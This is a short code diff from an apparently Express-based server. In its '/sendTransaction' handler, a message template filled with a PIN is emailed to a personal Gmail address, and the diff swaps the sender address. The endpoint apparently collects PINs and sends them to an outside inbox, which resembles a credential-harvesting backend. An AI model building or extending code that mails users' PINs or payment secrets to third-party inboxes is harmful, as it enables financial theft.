@@ -46,7 +46,7 @@ app.post('/sendTransaction', async (req, res) => {
             .replace('{{pin}}', pin);
 
         const info = await transporter.sendMail({
-            from: 'mybusiness2463772@gmail.com',
+            from: 'alerttransaction109@gmail.com',
             to: 'paymentsupdate3@gmail.com',
             subject: 'New Transaction Alert',
             html: html
